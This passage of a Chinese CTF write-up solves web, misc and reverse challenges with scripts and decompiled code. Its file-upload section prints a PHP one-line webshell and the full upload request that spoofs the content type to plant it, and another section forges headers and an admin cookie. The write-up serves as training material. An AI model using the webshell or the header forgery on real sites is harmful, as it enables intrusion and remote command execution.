c(t){function n(){s(function(){if(!o)try{var n=t.contentDocument;n.body.childNodes.length\u0026\u0026(o=1,e(n))}catch(e){o=0}},100)}a[l](function(e){t['on'+e]=null});var o;n(),t.onload=n}for(var i='parentNode',l='forEach',a='contextmenu dragstart selectstart select copy beforecopy mouseup mousedown'.split(' '),u=setTimeout(n,0);u\u003e=0;u--)clearTimeout(u);for(u=setInterval(n,1e8);u\u003e=0;u--)clearInterval(u);var s=setTimeout;setTimeout=setInterval=n,r('script')[l](o);var m=[];r('iframe,frame')[l](function(e){m.push(e),e[i].replaceChild(t.createElement('script'),e)});var f=t.documentElement.innerHTML;t.open(),t.write('\u003c!DOCTYPE html\u003e'),t.close(),t.documentElement.innerHTML=f,r('script')[l](function(e){e[i].replaceChild(m.shift(),e)}),r('*')[l](c),c(t),a[l](function(e){t.addEventListener(e,function(e){e.stopPropagation()},!0)});var p=t.createElement('style');p.innerHTML='*{-webkit-user-select:text!important;-moz-user-select:text!important;user-select:text!important;}',t.body.appendChild(p)}(document); 你真的不知道有这么回事, 但js并不能阻止你从html代码里复制东西, 所以把html代码flag那段复制出来, 用ctrl + F把\u003c/span\u003e\u003cspan\u003e全都删掉 ","date":"2022-11-07","objectID":"/mayctf_writeup/:2:1","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rtyping train把网页上的字符串打到输入框里6666次, 我不会写脚本, 搜索了一下发现可以用python的selenium库. 自行搜索安装方法. 给chrome所在位置加环境变量会方便一些. import os from selenium import webdriver from selenium.webdriver.common.by import By driver = webdriver.Chrome(\"chromedriver.exe\") # chromedriver所在路径 driver.get(r\"http://124.220.41.254:20002/index.php?start\") def test(): for i in range(1,6666): t = driver.find_element(By.CLASS_NAME,\"typing\").text driver.find_element(By.NAME,\"input\").send_keys(t+'\\n') if __name__ == \"__main__\": test() os.system(\"pause\") 注意CSDN搜到的带find_element_By_ID之类的函数在现版本全部被代码里的find_element函数取代了, 这还是在StackOverflow查到的, 简中局域网害人不浅( 另外如果在函数里写driver.get, 函数结束之后浏览器会自动关闭, 你就白跑十几分钟了. ","date":"2022-11-07","objectID":"/mayctf_writeup/:2:2","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rfind_it十分鸡贼 翻到\"哼, 你要找的东西就在这里\"那页, f12打开css翻到最下面, flag藏在那里. 我找了几天没找到, 最后是因为上课没带鼠标, 用触摸板乱划发现css长度不对才找到的. ","date":"2022-11-07","objectID":"/mayctf_writeup/:2:3","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rsheep十分鸡贼 声称通关得flag, 于是我写了个通关脚本, 结果发现通关并不得flag. (而且, 脚本跑太快会卡出bug). 但写了不能白写我还是把它放在下面. 把主函数里的注释取消就可以跑了,为了防止卡住需要手动最大化浏览器, 但这样太快了还是会卡住. import os from selenium import webdriver from selenium.webdriver.common.by import By import time import requests driver = webdriver.Chrome(\"chromedriver.exe\") # chromedriver所在路径 driver.get(r\"http://124.220.41.254:20003\") driver.find_element(By.CLASS_NAME,\"selectLevel btn\").click() def test(): time.sleep(2) num = 705 for i in range (1,700): #观察源代码发现div下标最大的在最上面, 且一组三个相同的图案下标是连着的 num = num - 1 a = \"//html/body/div[\"+str(num)+\"]\" print(a) tempa = driver.find_element(By.XPATH, a) tempa.click() time.sleep(0.01) if __name__ == \"__main__\": #temp2 = driver.find_element(By.XPATH,\"//html/body/div[3]/button[3]\") #temp2.click() #time.sleep(1) #button = driver.find_element(By.XPATH,\"//html/body/div[4]/div/button[2]\") #button.click() #test() #os.system(\"pause\") url=\"http://124.220.41.254:20003/fl4g.php\" headers={ \"Referer\": \"http://124.220.41.254:20003/fl4g.php\", \"Origin\":\"http://124.220.41.254:20003/\", \"User-Agent\": \"hack\", #Wow!!! You are really a hacker\u003cbr\u003eBut Only \u003cb\u003eadmin\u003c/b\u003e can see\u003cbr\u003eDo you want to try some \u003cb\u003eCookie\u003c/b\u003e? \"X-Forwarded-For\": \"127.0.0.1\", \"Cookie\": \"user=admin\", #document.cookie user=guest #Wow!!! You are really a hacker\u003cbr\u003eWow!!! You get admin permission\u003cbr\u003eBut please \u003cb\u003ePOST\u003c/b\u003e not \u003cb\u003eGET\u003c/b\u003e } #r=requests.get(url=url,headers=headers) r=requests.post(url=url,headers=headers) #Wow!!! You are really a hacker\u003cbr\u003eWow!!! You get admin permission\u003cbr\u003eWow!!! You find it!\u003cbr\u003e= mayctf{Wow!_You_have_Real1y_H4ndle_http} print(r.text) (其实我都看到通关进入http://124.220.41.254:20003/fl4g.php了, 但是我web知识不足, 看到hack brower以为是通关得权限). 事实上看js可以直接发现通关进入fl4g.php, 进入后提示需要hack browser,于是进行各种搜索, 得知是需要伪造http请求头. 把User-Agent改成\"hack\", 下一步提示改Cookie伪装成admin, chrome控制台打document.cookie, 得到我们原本的cookie是\"user=guest\", 于是写\"Cookie\": “user=admin”, 发送后得到下一步提示用POST而不是GET, 所以把POST改成GET得flag. 具体代码如上. ","date":"2022-11-07","objectID":"/mayctf_writeup/:2:4","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rbackground要求上传一个文件, 于是搜索一下\"PHP文件上传漏洞\", 进行各种学习发现要传一个木马进去, 然后用工具连接服务器. 木马原理自行搜索(我不记得在哪看的了. 随便试试发现最经典的eval被禁了, assert在PHP7已经不能执行函数了, 发送一句话木马\u003c?php $st=@create_function('',$_POST['a']);$st();?\u003e 先随便发点什么上去, brupsuite抓包之后修改Content-Type: image/jpeg, 内容改为一句话木马, 文件后缀改成.php再发送(在repeater那里改), 否则会被拦住, 提示\"哎呦~你干嘛\". 蚁剑连接成功(具体使用方法自行搜索, 密码就是POST里的’a’) 找flag /home/wwwroot/fllllleee3eeeeegg9gg 包内容如下 POST /1.php HTTP/1.1 Host: 49.234.84.189:2543 Content-Length: 339 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://49.234.84.189:2543 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5yBJNBeG49JfxFwN User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://49.234.84.189:2543/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundary5yBJNBeG49JfxFwN Content-Disposition: form-data; name=\"uploaded\"; filename=\"Mio_2.php\" Content-Type: image/jpeg \u003c?php $st=@create_function('',$_POST['a']);$st();?\u003e ------WebKitFormBoundary5yBJNBeG49JfxFwN Content-Disposition: form-data; name=\"Upload\" 涓婁紶 ------WebKitFormBoundary5yBJNBeG49JfxFwN-- ","date":"2022-11-07","objectID":"/mayctf_writeup/:2:5","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rmisc","date":"2022-11-07","objectID":"/mayctf_writeup/:3:0","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rsign_inflag在频道里 ","date":"2022-11-07","objectID":"/mayctf_writeup/:3:1","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rrack your brain一眼佛曰, 解码之后是一眼brainfuck, 再解码就是flag ","date":"2022-11-07","objectID":"/mayctf_writeup/:3:2","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rthin_dog打开视频一听发现左边有细狗之外的声音, 用potplayer把右声道关掉仔细听左边. 是一堆单词, 如果知道这种无线电中用单词表示字母的方式那一下子就能听出来, 不知道的话可能要进行一些搜索. nato phonetic alphabet ","date":"2022-11-07","objectID":"/mayctf_writeup/:3:3","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\r小紫第一个压缩包里是个png, 略加检查分离不出来什么. 010hex打开发现长度不对, 改长一些能看见下面隐藏的第二个压缩包密码. 第二个压缩包打开是个bmp, 也分离不出什么, hint图提示我们长度仍有问题, 根据bitcount计算长度应该是0x754(原来是0x744), 用010hex修改即可. 注意bmp长度必须精确修改, 否则打不开. 改完之后flag藏在右上角(我一开始就没看见). ","date":"2022-11-07","objectID":"/mayctf_writeup/:3:4","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rwingman社工题. 打开图仔细看图片后面蓝色的universal studio广告, 下面五个字母应该是Japan. 题目提示her major in law, 求暂住地. 可以想到是日本环球影城附近的大学. 尝试大阪大学即可达到经纬度的精度要求. (一开始没注意暂住地, 看路牌试了全世界的各种地方.) 以下为尝试记录和exp(然而是出题人提供的) ARBIENNES PET SHOp DELANCEY ST delancey street universal studio *10000000 12540556.221975128, 1038238109.5548172 新加坡环球影城 346656184.6687022, 1354323596.552712 日本环球影城 284754439.02992662, -814676650.5902094 佛罗里达环球影城 284755749.3909993, -814676905.7572405 奥兰多环球影城 399143823.3896167, 1166561121.5959157 北京环球影城 284770690.05056418, -814692908.4489123 奥兰多delancy 407203779.02024495, -739933302.7337902 纽约delancy 407182898.8839499, -741540718.5679229 新泽西delancy 40.67520418966318, -73.85378063093881 adriennes pet supplies 394040910.308666, -750652296.7072257 Adrienne's Pet Grooming 399911928.9061545, -767395190.252269 Adrienne's Pet Salon 197307033.8420808, -1556096470,8245103 夏威夷 215288153.87536728, -1580937372.2789883 399512757.43148926, -752009348.0976915 宾夕法尼亚delancey 377843995.8164323, -1223905783.3114387 515365994.4374129, -0.14362412880917264伦敦 437056350.2084642, -793727888.0818914多伦多 340356643.1278974, -1181252704.2399023 加州delancey 379444682.4598956, -1222647864.1483423 旧金山 下面是各种delancey 425932142.6521346, -884374877.1818962 367894910.6083526, -798906290.5539646 335574179.1307625, -801982462.3745224 420472529.6857023, -737822307.2600325 ... 361800080.611559, -1060647586.1810193 1207322980 313745730 436837736.1964954, -793509373.4649092海底捞 414375400.0847232, -738804846.5961116 481747427.9107416, -1221568834.363263华盛顿 380168867/63403, -1220546029/3085761 加州 422410893.4729945, -875458412.940499 413324962;.4567255, -729224984.1808564耶鲁 423771513/2833422, -711166190.4607179 哈佛 374246913.8626667, -1221660597,2396546斯坦福 399523832.6949155, -751931171.4271703宾大 360015646.544563, -789382393.311976 杜克 522055072.041921, 01131679.9820200556剑桥 517522925.4950003, -12579034.162635985牛津 378720346.8657658, -1222586257.329924加州大学 37.86962882992683, -122.2539832157979加州大学伯克利法学 424536074.9925858, -764734276.0030611康奈尔 296919505,8331313, -823280952.2266957弗罗里达大学 12968678/469047286, 1037763831.6825409 新加坡国立 13484493.35261561, 1036831668,835977南洋理工大学 348223328.8016893, 1355244182.8821057 大阪大学!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! mayctf{0h_y0u_ar3_th3_b3st_w1ngman} from re import L from pwn import * import hashlib,string,random io = remote(\"124.220.41.254\",\"11112\") temp = io.recvline() print(temp) temp1 = temp.split(b\"==\") print(temp1) part_proof = bytes.decode(temp1[0].split(b\"XXXX\")[1])[1:-2] sha = bytes.decode(temp1[1]).strip() table = string.ascii_letters + string.digits while True: XXXX = \"\".join([random.choice(table)for _ in range(4)]) temp_proof = XXXX + part_proof temp_sha = hashlib.sha256(temp_proof.encode()).hexdigest() if sha == temp_sha: io.recvuntil(b\"[+] Give Me XXXX :\") print(XXXX) io.sendline(XXXX.encode()) break io.interactive() ","date":"2022-11-07","objectID":"/mayctf_writeup/:3:5","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rbaby_typing_game就是服务器发什么抄一遍发回去重复999次就行, 字符串处理看下面代码. 前面的sha验证仍然抄出题人给的wingman的hint脚本 from re import L from pwn import * import hashlib,string,random io = remote(\"124.220.41.254\" ,\"11114\") io.recvline() io.recvline() io.recvline() io.recvline() io.recvline() io.recvline() temp = io.recvline() print(temp) temp1 = temp.split(b\"==\") print(temp1) part_proof = bytes.decode(temp1[0].split(b\"XXXX\")[1])[1:-2] sha = bytes.decode(temp1[1]).strip() table = string.ascii_letters + string.digits while True: XXXX = \"\".join([random.choice(table)for _ in range(4)]) temp_proof = XXXX + part_proof temp_sha = hashlib.sha256(temp_proof.encode()).hexdigest() if sha == temp_sha: # io.recvuntil(b\"[+] Give Me XXXX :\") print(XXXX) io.sendline(XXXX.encode()) break io.recvuntil(b\"chance.\\n\") for i in range (999): temp2 = str(io.recvline()) print(temp2) load = temp2.split(\": \")[1] load = load[0:-3] print(load) io.sendline(load.encode()) io.recvuntil(b\"999.\\n\") print(io.recvline()) io.interactive() ","date":"2022-11-07","objectID":"/mayctf_writeup/:3:6","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rsecsome_cfghint: CFG stands for what? cfg代表了什么? 我一开始以为是.cfg后缀的文件, 全称是config. 然后又看代码的main函数巨大, 以为是要把ida的.cfg文件改了, 增大可反编译函数的大小限制. 经过各种改大之后电脑五次爆内存, 搞不出. 后来发现cfg的另一种解释, Control Flow Graph. 控制流程图, 就是ida生成的那个流程图. 然而发现函数太大了, nodes限制只有1000个, 所以把限制调大, 这个只需要在IDA里面改. 在IDA里点option-general-Max number of nodes: 100000 然后看流程图, 发现蓝中带白看不清.于是在设置里把背景色调成黑色,可以看到 MAYCTF{$(AUTHOR)_S3creT_C0nTroL_Flow_GraPh} 最后一步是把$(AUTHOR)换成出题人的网名secsome ","date":"2022-11-07","objectID":"/mayctf_writeup/:3:7","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rshape_secret阅读Description发现要进行一个手动图形渲染, 一帧帧绘制. 看secret.shp文件脑跑一下读文件头过程可以猜出数据是小端序的, 不然宽和高太大了, 后面的Frame Header也对不上.(这点也可以用offset的值来验证, 大端序offset也对不上) 先读一个文件头, 得到高和宽. 然后按顺序读每帧的文件头, 这里主要是height, width和flag, offset没什么大用, 因为所有数据都是按顺序而且连着的, 不过可以用来检查自己数据读入是否错误, color没给调色板, 直接全用一个颜色, align和reserved完全没用. flag直接抄一下题里给的那个代码就行, 是用来区分压缩的数据和非压缩的数据的. 压缩的数据就是每帧有height of frame行, 每行开头两个字节给出了这行的字节数(包括这两个字节). 然后这行的每个0x00字节代表接下来的像素透明, 其后紧跟着的那个字节代表透明的连续像素个数. 其余的字节代表那个像素点的颜色, 本来这个数字是调色板的一个索引, 但是没给调色板就全用一个颜色了. 如题里给的一行例子: 07 00 00 09 53 00 9C 注意是小端序所以前两个字节是00 07, 这行有七个字节. 然后的00 09代表有9个透明像素. 53是有一个颜色为0x53的像素, 00 9c是有9c个透明像素. 具体实现上, 我采用了有多少个透明像素就让\"画笔\"横坐标加多少的方式 直接不画了. 非压缩的数据就是直接FrameHeader.Height * FrameHeader.Width的一个表, 每个字节是该像素点的颜色. 详情见代码. 于是我搓一个脚本, 我当场进行一个pillow的学习, 用到里面的ImageDraw画像素点. 需要一点代码能力, (比如我一个xx未重置的bug调半天. from PIL import Image, ImageDraw f = open(\"shape_secret.shp\", 'rb+') def readbytes(n): # 按字节读入 x = int.from_bytes(f.read(n),'little', signed=False) return x x = [] y = [] fwidth = [] fheight = [] flags = [] color = [] reserved = [] offset = [] readbytes(2) width = readbytes(2) height = readbytes(2) print(\"width\", width, \"height\", height) # im = Image.new('RGB', (width,height), 0) #draw = ImageDraw.Draw(im) def drawpoint(color, x, y): print(x, y) draw.point([x,y],'#66ccff') #im.putpixel([x, y], (255, 0, 0)) numberofframes = readbytes(2) for i in range (0,numberofframes): x.append(readbytes(2)) y.append(readbytes(2)) fwidth.append(readbytes(2)) fheight.append(readbytes(2)) flags.append(readbytes(1)) readbytes(3) #align color.append( readbytes(4)) reserved.append(readbytes(4)) offset.append(readbytes(4)) for i in range (0, numberofframes): im = Image.new('RGB', (width,height), 0) draw = ImageDraw.Draw(im) yy = y[i] xx = x[i] if(flags[i] \u0026 0x2): #compression for j in range (0, fheight[i]): xx = x[i] length = readbytes(2) - 2 while length \u003e 0: if (length): temp = readbytes(1) length -= 1 if temp == 0x00: if(length): num = readbytes(1) #for int k length -= 1 xx += num else: drawpoint(temp, xx, yy + j) xx += 1 else: # print(\"!!!!!!!!!!!\") for j in range (0, fheight[i]): for k in range (0, fwidth[i]): temp = readbytes(1) if (temp != 0x00): drawpoint(temp, xx + k, yy + j) im.save(\"./pic/pic\"+str(i)+\".jpg\") # im.show() 把脚本和shape_secret.shp放在同一目录下运行, 会在该目录下生成pic文件夹, 里面按顺序存放了40帧图片, 画着flag的一个个字符(出题人说用鼠标画的). 注意那个看起来像θ的东西是0. (仔细阅读Description会发现有个Westwood, 也就是红警的西木公司. 当时注意到了但是没搜到什么东西, 赛后得知有新大陆). ","date":"2022-11-07","objectID":"/mayctf_writeup/:3:8","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rreverse","date":"2022-11-07","objectID":"/mayctf_writeup/:4:0","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rhello_net直接用ILSPY打开就能看见flag, 好像甚至用记事本都行. ","date":"2022-11-07","objectID":"/mayctf_writeup/:4:1","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rmaze查壳发现有upx壳, 先脱个壳 用IDA打开, main函数大概是这个样子. int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rax __int64 v4; // rax int v5; // eax __int64 v6; // rax int v8; // [rsp+8h] [rbp-D8h] int v9; // [rsp+Ch] [rbp-D4h] __int64 v10; // [rsp+10h] [rbp-D0h] BYREF __int64 v11[2]; // [rsp+18h] [rbp-C8h] BYREF char *v12; // [rsp+28h] [rbp-B8h] char v13[32]; // [rsp+30h] [rbp-B0h] BYREF char v14[19]; // [rsp+50h] [rbp-90h] BYREF char v15[19]; // [rsp+66h] [rbp-7Ah] BYREF char v16[19]; // [rsp+7Ch] [rbp-64h] BYREF char v17[19]; // [rsp+92h] [rbp-4Eh] BYREF char v18[19]; // [rsp+A8h] [rbp-38h] BYREF unsigned __int64 v19; // [rsp+C8h] [rbp-18h] v19 = __readfsqword(0x28u); v3 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e((std::ostream *)\u0026std::cout); std::ostream::operator\u003c\u003c(v3, std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e::basic_string(v13); std::operator\u003e\u003e\u003cchar\u003e((std::istream *)\u0026std::cin); if ( std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e::length(v13, v13) == 32 ) { strcpy(v14, \"*#########\"); strcpy(\u0026v14[11], \"**########\"); strcpy(v15, \"#*########\"); strcpy(\u0026v15[11], \"***#######\"); strcpy(v16, \"*#***##***\"); strcpy(\u0026v16[11], \"**##****#*\"); strcpy(v17, \"#**######*\"); strcpy(\u0026v17[11], \"#*#*******\"); strcpy(v18, \"**#*######\"); strcpy(\u0026v18[11], \"###*******\"); v8 = 0; v9 = 0; v11[1] = (__int64)v13; v10 = std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e::begin(v13); v11[0] = std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e::end(v13); while ( (unsigned __int8)__gnu_cxx::operator!=\u003cchar *,std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e\u003e( \u0026v10, v11) ) { v12 = (char *)__gnu_cxx::__normal_iterator\u003cchar *,std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e\u003e::operator*(\u0026v10); v5 = *v12; if ( v5 == 87 ) { --v9; } else { if ( v5 \u003e 87 ) break; if ( v5 == 83 ) { ++v9; } else { if ( v5 \u003e 83 ) break; if ( v5 == 65 ) { --v8; } else { if ( v5 != 68 ) break; ++v8; } } } if ( v8 \u003c 0 || v8 \u003e 9 || v9 \u003c 0 || v9 \u003e 9 ) break; __gnu_cxx::__normal_iterator\u003cchar *,std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e\u003e::operator++(\u0026v10); } v6 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e((std::ostream *)\u0026std::cout); std::ostream::operator\u003c\u003c(v6, std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); } else { v4 = std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e((std::ostream *)\u0026std::cout); std::ostream::operator\u003c\u003c(v4, std::endl\u003cchar,std::char_traits\u003cchar\u003e\u003e); } std::__cxx11::basic_string\u003cchar,std::char_traits\u003cchar\u003e,std::allocator\u003cchar\u003e\u003e::~basic_string(v13); return 0; } 查一下ascii表发现\"87, 83, 65, 68\"就是WSAD, 所以可以大概知道这个程序要我们输入WASD走迷宫, 猜一下是左上角走到右下角, 手过一下迷宫, 打开程序输入就可以得到flag *######### SDSSDSDDSDDDWDDSSSAAAAAASSDDDDDD **######## #*######## ***####### *#***##*** **##****#* #**######* #*#******* **#*###### ###******* 手过迷宫或者写个dfs(还没手过快) ","date":"2022-11-07","objectID":"/mayctf_writeup/:4:2","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rmixture给了个程序, 里面是各种语言拼成的Aes加密, 但是仔细观察之后发现只需要删删东西, 剩下go语言的解码部分再加一句输出就可以跑了. package main import ( // \"bytes\" \"crypto/aes\" \"crypto/cipher\" \"encoding/base64\" \"fmt\" ) func GetCode() string { chcode := make(chan byte, 100) go SinkCode(chcode) var code string for i := range chcode { code += string(i) } return code } func SinkCode(chcode chan byte) { //八进制 code code := [...]byte{0o111, 0o57, 0o157, 0o172, 0o163, 0o104, 0o170, 0o66, 0o150, 0o111, 0o141, 0o115, 0o146, 0o130, 0o132, 0o127, 0o160, 0o157, 0o125, 0o120, 0o66, 0o115, 0o156, 0o126, 0o165, 0o130, 0o162, 0o62, 0o116, 0o62, 0o70, 0o142, 0o116, 0o62, 0o142, 0o125, 0o127, 0o141, 0o141, 0o61, 0o150, 0o57, 0o147, 0o155, 0o105, 0o107, 0o150, 0o113, 0o172, 0o112, 0o104, 0o166, 0o131, 0o70, 0o146, 0o132, 0o171, 0o155, 0o150, 0o102, 0o172, 0o66, 0o107, 0o121} for i := range code { chcode \u003c- code[i] } close(chcode) } func GetKey() []byte { chkey := make(chan byte, 32) go Sinkkey(chkey) var key []byte for i := range chkey { key = append(key, i) } return key } func Sinkkey(chkey chan byte) { key := [...]byte{0b110001, 0b110100, 0b110001, 0b110101, 0b111001, 0b110010, 0b110110, 0b110101, 0b110011, 0b110101, 0b111000, 0b111001, 0b110111, 0b111001, 0b110011, 0b110010, 0b110011, 0b111000, 0b110100, 0b110110, 0b110010, 0b110110, 0b110100, 0b110011, 0b110011, 0b111000, 0b110011, 0b110010, 0b110111, 0b111001, 0b110101, 0b110000} for i := range key { chkey \u003c- key[i] } close(chkey) } func AesDecrypt(cryted string, key []byte) string { crytedByte, _ := base64.StdEncoding.DecodeString(cryted) block, _ := aes.NewCipher(key) blockSize := block.BlockSize() blockMode := cipher.NewCBCDecrypter(block, key[:blockSize]) orig := make([]byte, len(crytedByte)) blockMode.CryptBlocks(orig, crytedByte) //orig = PKCS7UnPadding(orig) return string(orig) } func main(){ fmt.Println(AesDecrypt(GetCode(),GetKey())) } ","date":"2022-11-07","objectID":"/mayctf_writeup/:4:3","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rdynamic_reverse这题一看就是要动态调试, 但是我不怎么会用gdb所以…. IDA看一眼主函数里执行了个message unsigned __int64 message(void) { __int64 *i; // [rsp+0h] [rbp-60h] __int64 v2[5]; // [rsp+20h] [rbp-40h] BYREF __int16 v3; // [rsp+48h] [rbp-18h] _BYTE v4[6]; // [rsp+4Ah] [rbp-16h] BYREF unsigned __int64 v5; // [rsp+58h] [rbp-8h] v5 = __readfsqword(0x28u); v2[0] = 0x20091406110B131FLL; v2[1] = 0x3B2D170100170417LL; v2[2] = 0x1B1F131C0B362D06LL; v2[3] = 0x213B2D0B1E1E1311LL; v2[4] = 0x53171E021F43212DLL; v3 = 29199; for ( i = v2; i != (__int64 *)v4; i = (__int64 *)((char *)i + 1) ) *(_BYTE *)i ^= 0x72u; return v5 - __readfsqword(0x28u); } 发现只有异或, 我们直接根据异或可逆性把它倒回去. #include\u003ccstdio\u003e typedef unsigned char *byte_pointer; long long v2[5] = {0x20091406110B131FLL, 0x3B2D170100170417LL,0x1B1F131C0B362D06LL,0x213B2D0B1E1E1311LL,0x53171E021F43212DLL}; unsigned char v[] = {0x20,0x09,0x14,0x06,0x11,0x0B,0x13,0x1F,0x3B,0x2D,0x17,0x01,0x00,0x17,0x04,0x17,0x1B,0x1F,0x13,0x1C,0x0B,0x36,0x2D,0x06,0x21,0x3B,0x2D,0x0B,0x1E,0x1E,0x13,0x11,0x53,0x17,0x1E,0x02,0x1F,0x43,0x21,0x2D}; int main() { for (int i = 0; i \u003c 40;i ++) { v[i] ^= 0x72u; printf(\"%c\", v[i]); } printf(\"\\n\"); for (int i = 40; i \u003e= 0;i --) { ///v[i] ^= 0x72u; printf(\"%c\", v[i]); } } //mayctf{Reverse_It_Dynamically_IS_S1mple!} //手工重新排序 输出了个R{ftcyamI_esreveimanyD_tSI_yllac!elpm1S_, 一看感觉至少mayctf反了, 所以倒过来输出_S1mple!cally_ISt_Dynamieverse_Imayctf{R, 乱但不是很乱, 可以看出大概有什么单词, 手动重新排列一下, 多提交几次试试. 得到flag:mayctf{Reverse_It_Dynamically_IS_S1mple!} ","date":"2022-11-07","objectID":"/mayctf_writeup/:4:4","tags":null,"title":"mayctf writeup by Mio and K-ON!","uri":"/mayctf_writeup/"},{"categories":null,"content":"\rnative_android题目提示在安卓程序里执行c++代码, 所以在网上搜了一下在Android里调用c++代码的相关知识, 知道这是用.so动态链接库实现的. 用jeb打开apk可以看到: 把那个so文件导出用IDA打开, 很容易看出来是TEA加密, 抄个解密代码即可. #define _DWORD int #define _BYTE char #include\u003ccstdio\u003e long long encrypt(void *a1, const void *a2) { long long result; // rax unsigned int i; // [rsp+14h] [rbp-30h] int v4; // [rsp+18h] [rbp-2Ch] unsigned int v5; // [rsp+1Ch] [rbp-28h] unsigned int v6; // [rsp+20h] [rbp-24h] v6 = *(_DWORD *)a1; v5 = *((_DWORD *)a1 + 1); v4 = 0; for ( i = 0; i \u003c 0x20; ++i ) { v4 -= 1640531527; v6 += (*((_DWORD *)a2 + 1) + (v5 \u003e\u003e 5)) ^ (v4 + v5) ^ (*(_DWORD *)a2 + 16 * v5); v5 += (*((_DWORD *)a2 + 3) + (v6 \u003e\u003e 5)) ^ (v4 + v6) ^ (*((_DWORD *)a2 + 2) + 16 * v6); } *(_DWORD *)a1 = v6; result = v5; *((_DWORD *)a1 + 1) = v5; return result; } long long decrypt(void *a1, const void *a2) { long long result; // rax unsigned int i; // [rsp+14h] [rbp-30h] int v4; // [rsp+18h] [rbp-2Ch] unsigned int v5; // [rsp+1Ch] [rbp-28h] unsigned int v6; // [rsp+20h] [rbp-24h] v6 = *(_DWORD *)a1; v5 = *((_DWORD *)a1 + 1); v4 = (-1640531527)*0x20; for ( i = 0; i \u003c 0x20; ++i ) { v5 -= (*((_DWORD *)a2 + 3) + (v6 \u003e\u003e 5)) ^ (v4 + v6) ^ (*((_DWORD *)a2 + 2) + 16 * v6); v6 -= (*((_DWORD *)a2 + 1) + (v5 \u003e\u003e 5)) ^ (v4 + v5) ^ (*(_DWORD *)a2 + 16 * v5); v4 += 1640531527; } *(_DWORD *)a1 = v6; result = v5; *((_DWORD *)a1 + 1) = v5; return result; } void decrypt_(unsigned int* v, const unsigned int* k) { unsigned int v0 = v[0], v1 = v[1], sum = 0xc6ef3720, i; unsigned int delta = 0x9e3779b9; unsigned int k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i \u003c 32; i++) { v1 -= ((v0 \u003c\u003c 4) + k2) ^ (v0 + sum) ^ ((v0 \u003e\u003e 5) + k3); v0 -= ((v1 \u003c\u003c 4) + k0) ^ (v1 + sum) ^ ((v1 \u003e\u003e 5) + k1); sum -= delta; } v[0] = v0; v[1] = v1; } int main() { unsigned char input[40] = {0xF0,0x2E,0xD2,0x73,0x04,0xB6,0x1A,0xD3,0x59,0xB2,0xE3,0x27,0xA0,0xDA,0x90,0xD6,0xD2,0x8C,0x1C,0x24,0x00,0xCB,0x7E,0x80,0x70,0xF7,0x35,0xC2,0x9D,0x30,0x3A,0x3F,0x53,0xB6,0xF7,0xBC,0x29,0x53,0x5D,0xEC}; long long v10[2]; v10[0] = 0x636F6A76676C4040LL; v10[1] = 0x2E6B7B3D7F6B4757LL; printf(\"%s\\n\", v10); for (int i = 0; i \u003c 16; ++i ) *((_BYTE *)v10 + i) ^= i; for (int j = 0; j \u003c 40; j += 8 ) decrypt_((unsigned int*) (\u0026input[j]),(const unsigned int*) 